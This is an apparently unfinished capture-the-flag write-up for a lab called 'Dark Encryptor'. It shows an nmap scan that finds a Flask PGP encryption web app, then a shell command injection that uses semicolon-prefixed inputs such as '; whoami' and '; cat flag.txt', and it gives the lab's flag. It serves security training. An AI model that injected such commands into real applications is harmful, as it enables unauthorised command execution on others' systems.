# Dark Encryptor

!!!!insert img description!~!!!!

### 1. discover website
!!!! uinsert website image!!!!
description naka host ng apache2 

### 2. recon
let's see if there are other ports open
```
┌──(kali㉿kali)-[~]
└─$ nmap 10.10.152.198 -sC -sV     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-19 10:42 EDT
Nmap scan report for 10.10.152.198
Host is up (0.28s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a3:76:19:ca:96:af:d5:be:ac:2d:31:b4:27:16:ad:26 (ECDSA)
|_  256 8e:ff:da:33:50:22:93:e9:e3:60:ab:6f:ee:f2:07:d9 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.1 Python/3.12.3
|     Date: Wed, 19 Mar 2025 14:42:31 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2216
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     X-XSS-Protection: 1; mode=block
|     Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>PGP Encryption Tool</title>
|     <style>
|     body {
|     font-family: Arial, sans-serif;
|     background-color: #121212;
|     color: #e0e0e0;
|     text-align: center;
|     padding: 20px;
|     color: #ff4081;
|     form {
|     margin-top: 20px;
|     select, textarea, button {
|     padding: 10px;
|     font-size: 16px;
|     margin: 5px;
|     border-radius: 5px;
|     select
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=3/19%Time=67DAD7D8%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,9FF,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.1\
SF:x20Python/3\.12\.3\r\nDate:\x20Wed,\x2019\x20Mar\x202025\x2014:42:31\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x202216\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20D
SF:ENY\r\nX-XSS-Protection:\x201;\x20mode=block\r\nContent-Security-Policy
SF::\x20default-src\x20'self';\x20style-src\x20'self'\x20'unsafe-inline'\r
SF:\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">
SF:\n<head>\n\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20<meta\x20name=\"
SF:viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\
SF:x20\x20<title>PGP\x20Encryption\x20Tool</title>\n\x20\x20<style>\n\x20\
SF:x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20font-family:\x20Arial,\x2
SF:0sans-serif;\n\x20\x20\x20\x20\x20\x20background-color:\x20#121212;\n\x
SF:20\x20\x20\x20\x20\x20color:\x20#e0e0e0;\n\x20\x20\x20\x20\x20\x20text-
SF:align:\x20center;\n\x20\x20\x20\x20\x20\x20padding:\x2020px;\n\x20\x20\
SF:x20\x20}\n\x20\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20color:\x20#f
SF:f4081;\n\x20\x20\x20\x20}\n\x20\x20\x20\x20form\x20{\n\x20\x20\x20\x20\
SF:x20\x20margin-top:\x2020px;\n\x20\x20\x20\x20}\n\x20\x20\x20\x20select,
SF:\x20textarea,\x20button\x20{\n\x20\x20\x20\x20\x20\x20padding:\x2010px;
SF:\n\x20\x20\x20\x20\x20\x20font-size:\x2016px;\n\x20\x20\x20\x20\x20\x20
SF:margin:\x205px;\n\x20\x20\x20\x20\x20\x20border-radius:\x205px;\n\x20\x
SF:20\x20\x20}\n\x20\x20\x20\x20select\x20")%r(RTSPRequest,16C,"<!DOCTYPE\
SF:x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20
SF:\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20respon
SF:se</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20versio
SF:n\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x2
SF:0code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x20
SF:unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.12 seconds
                                                                 
```
### 3. exploit

; whoami
```
Encrypted Output:
Usage: python3 enc.py -r <recipient> -t <text>
ubuntu
```

; ls -l
```
Encrypted Output:
Usage: python3 enc.py -r <recipient> -t <text>
total 36
-rw-rw-r-- 1 ubuntu ubuntu 3629 Mar 12 14:01 app.py
-rw-rw-r-- 1 ubuntu ubuntu 1682 Mar 11 16:00 app.py.save
-rw-rw-r-- 1 ubuntu ubuntu  139 Feb 10 14:11 app.wsgi
-rw-rw-r-- 1 ubuntu ubuntu 1171 Mar 12 13:59 enc.py
-rw-rw-r-- 1 ubuntu ubuntu   22 Mar 12 11:48 flag.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Mar 11 16:45 keys
drwxrwxr-x 2 ubuntu ubuntu 4096 Mar 11 19:42 static
drwxrwxr-x 2 ubuntu ubuntu 4096 Mar 12 14:06 templates
drwxr-xr-x 2 ubuntu ubuntu 4096 Mar 12 11:35 uploads
```

; cat flag.txt
```
Encrypted Output:
Usage: python3 enc.py -r <recipient> -t <text>
THM{pgp_cant_stop_me}

```
another way to also read the flag.txt
; find / -name flag.txt

```
Encrypted Output:
Usage: python3 enc.py -r <recipient> -t <text>
/var/www/webapp/flag.txt
```
cat /var/www/webapp/flag.txt
```
Encrypted Output:
Usage: python3 enc.py -r <recipient> -t <text>
THM{pgp_cant_stop_me}
```
